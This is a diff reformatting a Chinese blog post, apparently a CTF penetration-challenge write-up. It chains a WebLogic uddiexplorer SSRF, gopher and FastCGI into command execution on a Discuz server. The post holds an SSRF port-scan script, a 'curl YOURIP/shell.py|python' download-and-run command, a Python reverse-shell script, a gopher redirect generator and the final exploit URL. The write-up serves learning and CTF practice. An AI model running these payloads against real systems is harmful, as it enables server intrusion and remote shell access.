@@ -1,7 +1,144 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>三个白帽-寻找来自星星的你-第一期 - Virink's Blog</title><meta name="author" content="Virink"><meta name="keywords" content="PHP,CODE,AUDIT,CTF,Writeup,Sec,Virink,代码审计,技术博客,writeups,ctf"><meta name="description" content="Virink的小站,记录杂文与分享一些技术文章"><link href="/static/css/default.min.css" rel="stylesheet"><link rel="icon" type="image/x-icon" href="/static/img/favicon.ico"><link rel="icon" href="/static/img/favicon.ico"><link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml"><script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><body><div class="wrapper"><header><div class="header"><img src="/static/img/logo.png" alt="Virink's Blog logo"><p><a href="/" class="title">Virink's Blog</a></p><p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p></div><div class="social"><li class="social__item"><a href="https://www.virzz.comatom.xml" title="Virink's RSS"><i class="fa fa-rss"></i> <span class="label">RSS</span></a></li><li class="social__item"><a href="https://github.com/virink" title="Virink's GitHub"><i class="fa fa-github"></i> <span class="label">GitHub</span></a></li><li class="social__item"><a href="https://twitter.com/virinkz" title="Virink's Twitter"><i class="fa fa-twitter"></i> <span class="label">Twitter</span></a></li><li class="social__item"><a href="https://telegram.me/virink" title="Virink's Telegram"><i class="fa fa-paper-plane"></i> <span class="label">Telegram</span></a></li></div><div class="divider__50"></div><nav><li><a href="/">首页</a></li><li><a href="/tags">标签</a></li><li><a href="/archives">归档</a></li><li><a href="/about">关于</a></li><li><a href="/links">友链</a></li></nav></header><div class="divider__70"></div><div class="content"><div class="content-wrap"><article class="article animated fadeIn"><div class="article-title"><i class="fa fa-book"></i>&nbsp;<a href="/2016/06/06/three_white_hats_find_you_from_star_first.html">三个白帽-寻找来自星星的你-第一期</a></div><div class="article-tag"><div class="article-tag-item"><a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a></div><div class="article-tag-item"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div></div><div class="article-meta"><div class="article-date"><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-06-06 20:56:34">2016-06-06 20:56:34</time></div></div><section class="article-content markdown-body"><h2>挑战介绍</h2><p>来自星星的你被我给丢了，我可能需要用我所有的一切才能把你找回，编了两句就编不下去了，好吧，我承认这是一期渗透题，就是这么直接。</p><h2>挑战目标</h2><p>http://0761e975dda0c67cb.jie.sangebaimao.com/</p><h2>0x01 信息收集</h2><p>打開地址，是一個dz論壇。似乎不怎麼好玩啊，還是最新版本的。</p><p>既然是滲透了，感覺祭出大殺器“掃描目錄”！<strong>（字典才是關鍵）</strong></p><p>很快就get到關鍵信息了（排除dz原有的目錄及頁面）</p><pre><code>/info.php
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>三个白帽-寻找来自星星的你-第一期 - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="PHP,CODE,AUDIT,CTF,Writeup,Sec,Virink,代码审计,技术博客,writeups,ctf">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.comatom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <div class="divider__50"></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/about">关于</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <div class="divider__70"></div>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2016/06/06/three_white_hats_find_you_from_star_first.html">三个白帽-寻找来自星星的你-第一期</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-06-06 20:56:34">2016-06-06 20:56:34</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>挑战介绍</h2>
+
+<p>来自星星的你被我给丢了，我可能需要用我所有的一切才能把你找回，编了两句就编不下去了，好吧，我承认这是一期渗透题，就是这么直接。</p>
+
+<h2>挑战目标</h2>
+
+<p>http://0761e975dda0c67cb.jie.sangebaimao.com/</p>
+
+<h2>0x01 信息收集</h2>
+
+<p>打開地址，是一個dz論壇。似乎不怎麼好玩啊，還是最新版本的。</p>
+
+<p>既然是滲透了，感覺祭出大殺器“掃描目錄”！<strong>（字典才是關鍵）</strong></p>
+
+<p>很快就get到關鍵信息了（排除dz原有的目錄及頁面）</p>
+
+<pre><code>/info.php
 /uddiexplorer/
-</code></pre><p>一個是phpinfo()信息，很有用處的。</p><pre><code>/opt/discuz/info.php
-</code></pre><p>另一個是weblogic的東西。</p><p>果斷百度<strong>&quot;uddiexplorer 漏洞&quot;</strong>，馬上可以知道<strong>weblogic uddiexplorer</strong>存在<strong>SSRF</strong>漏洞。</p><p>這次滲透的關鍵就在於<strong>SSRF</strong>！！！</p><h2>利用漏洞</h2><p>SSRF並不只是搞內網，結合三個白帽的結界docker，搞127.0.0.1才是王道！</p><p>萬能的百度啊，搜索關鍵字<strong>&quot;SearchPublicRegistries ssrf 漏洞 exp&quot;</strong></p><p>得到<strong>http://www.tuicool.com/articles/UjaqIbz</strong></p><p>得到一個腳本，自己修改一下拿來用！！！</p><p><strong>端口掃描.py</strong></p><pre><code>#!/usr/bin/env python  
+</code></pre>
+
+<p>一個是phpinfo()信息，很有用處的。</p>
+
+<pre><code>/opt/discuz/info.php
+</code></pre>
+
+<p>另一個是weblogic的東西。</p>
+
+<p>果斷百度<strong>&quot;uddiexplorer 漏洞&quot;</strong>，馬上可以知道<strong>weblogic uddiexplorer</strong>存在<strong>SSRF</strong>漏洞。</p>
+
+<p>這次滲透的關鍵就在於<strong>SSRF</strong>！！！</p>
+
+<h2>利用漏洞</h2>
+
+<p>SSRF並不只是搞內網，結合三個白帽的結界docker，搞127.0.0.1才是王道！</p>
+
+<p>萬能的百度啊，搜索關鍵字<strong>&quot;SearchPublicRegistries ssrf 漏洞 exp&quot;</strong></p>
+
+<p>得到<strong>http://www.tuicool.com/articles/UjaqIbz</strong></p>
+
+<p>得到一個腳本，自己修改一下拿來用！！！</p>
+
+<p><strong>端口掃描.py</strong></p>
+
+<pre><code>#!/usr/bin/env python  
 # -*- coding: utf-8 -*- 
 
 import re
@@ -23,20 +160,150 @@ def scan(ip_str):
 
 if __name__ == &quot;__main__&quot;:
     scan(&#39;127.0.0.1&#39;)
-</code></pre><p>成功破出22，80，3306，7001，9000等端口。</p><p>SSRF+GOPHER一直都很牛逼，最近更是火熱。</p><p>還是百度~~</p><p>rr菊苣最新文章<a href="http://drops.wooyun.org/tips/16357">《Do Evil Things with gopher://》</a></p><blockquote><p>0x03 攻击 FastCGI<br><br>一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。<br><br>0x06 参考<br><br><a href="http://zone.wooyun.org/content/1060">PHP FastCGI 的远程利用</a></p></blockquote><h2>命令執行</h2><p>下載fcgi_exp</p><p>運行</p><pre><code>nc -l -p 9000 &gt;x.txt &amp; go run fcgi_exp.go system 127.0.0.1 9000 /opt/discuz/info.php &quot;curl YOURIP/shell.py|python&quot;
+</code></pre>
+
+<p>成功破出22，80，3306，7001，9000等端口。</p>
+
+<p>SSRF+GOPHER一直都很牛逼，最近更是火熱。</p>
+
+<p>還是百度~~</p>
+
+<p>rr菊苣最新文章<a href="http://drops.wooyun.org/tips/16357">《Do Evil Things with gopher://》</a></p>
+
+<blockquote>
+<p>0x03 攻击 FastCGI<br><br>
+一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。<br><br>
+0x06 参考<br><br>
+<a href="http://zone.wooyun.org/content/1060">PHP FastCGI 的远程利用</a></p>
+</blockquote>
+
+<h2>命令執行</h2>
+
+<p>下載fcgi_exp</p>
+
+<p>運行</p>
+
+<pre><code>nc -l -p 9000 &gt;x.txt &amp; go run fcgi_exp.go system 127.0.0.1 9000 /opt/discuz/info.php &quot;curl YOURIP/shell.py|python&quot;
 
 php -f gopher.php
-</code></pre><p>把payload保存到x.txt</p><p><strong>反彈shell的黑科技，bash反彈無效~~</strong></p><p>然後urlencode編碼payload生成ssrf.php</p><p><strong>shell.py</strong></p><pre><code>import socket,subprocess,os  
+</code></pre>
+
+<p>把payload保存到x.txt</p>
+
+<p><strong>反彈shell的黑科技，bash反彈無效~~</strong></p>
+
+<p>然後urlencode編碼payload生成ssrf.php</p>
+
+<p><strong>shell.py</strong></p>
+
+<pre><code>import socket,subprocess,os  
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
 s.connect((&quot;yourip&quot;,9999))  
 os.dup2(s.fileno(),0)  
 os.dup2(s.fileno(),1)  
 os.dup2(s.fileno(),2)  
 p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);
-</code></pre><p><strong>gopher.php</strong></p><pre><code>&lt;?php
+</code></pre>
+
+<p><strong>gopher.php</strong></p>
+
+<pre><code>&lt;?php
 $p = str_replace(&quot;+&quot;, &quot;%20&quot;, urlencode(file_get_contents(&quot;x.txt&quot;)));
 file_put_contents(&quot;ssrf.php&quot;, &quot;&lt;?php header(&#39;Location: gopher://127.0.0.1:9000/_&quot;.$p.&quot;&#39;);?&gt;&quot;);
 ?&gt;
-</code></pre><p>成功生成了利用文件ssrf.php</p><h2>反彈shell</h2><p>VPS運行</p><pre><code>nc -lvv 9999
-</code></pre><p>利用SSRF</p><pre><code>http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp?&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business%20location&amp;btnSubmit=Search&amp;operator=YOURIP/ssrf.php
-</code></pre><p>成功反彈~~~</p><h2>GETFLAG</h2><p>自己找吧</p></section><div class="article-copyright"><span>本文标题&nbsp;:&nbsp;</span><a href="/2016/06/06/three_white_hats_find_you_from_star_first.html" target="_blank">三个白帽-寻找来自星星的你-第一期</a><br><span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br><span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-06-06 20:56:34">2016-06-06 20:56:34</time><br><span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:39:01">2017-06-01 23:39:01</time><br><span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/06/06/three_white_hats_find_you_from_star_first.html" title="三个白帽-寻找来自星星的你-第一期" target="_blank">https://www.virzz.com/2016/06/06/three_white_hats_find_you_from_star_first.html</a><br><span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br><span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~</div></article><div class="toc" data-toc="h2" data-toccontainer="section"></div></div></div><div class="divider__70"></div><footer class="footer"><center><span class="footer__copyright">&copy; 2017-2018. | ❤ <a href="mailto:virink@outlook.com">Virink </a>| 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">default</a></span> <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span></center></footer></div><script>!window.jQuery&&document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script><script src="/static/js/hackrain.js"></script><script>$(document).ready(function(){hackrain()})</script><script src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js"></script><script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script><script src="//cdn.bootcss.com/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script><script src="/static/js/toc.min.js"></script><script>$(document).ready(function(){$("code").each(function(t,a){hljs.highlightBlock(a)}),MathJax.Hub.Config({tex2jax:{inlineMath:[["[latex]","[/latex]"],["\\(","\\)"]]}})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-83885261-1")</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>
+</code></pre>
+
+<p>成功生成了利用文件ssrf.php</p>
+
+<h2>反彈shell</h2>
+
+<p>VPS運行</p>
+
+<pre><code>nc -lvv 9999
+</code></pre>
+
+<p>利用SSRF</p>
+
+<pre><code>http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp?&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business%20location&amp;btnSubmit=Search&amp;operator=YOURIP/ssrf.php
+</code></pre>
+
+<p>成功反彈~~~</p>
+
+<h2>GETFLAG</h2>
+
+<p>自己找吧</p>
+
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/06/06/three_white_hats_find_you_from_star_first.html" target="_blank">三个白帽-寻找来自星星的你-第一期</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-06-06 20:56:34">2016-06-06 20:56:34</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:39:01">2017-06-01 23:39:01</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/06/06/three_white_hats_find_you_from_star_first.html" title="三个白帽-寻找来自星星的你-第一期" target="_blank">https://www.virzz.com/2016/06/06/three_white_hats_find_you_from_star_first.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <div class="divider__70"></div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2017-2018. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">default</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/static/js/hackrain.js"></script>
+  <script>
+    
+  </script>
+  
+
+<script src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdn.bootcss.com/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
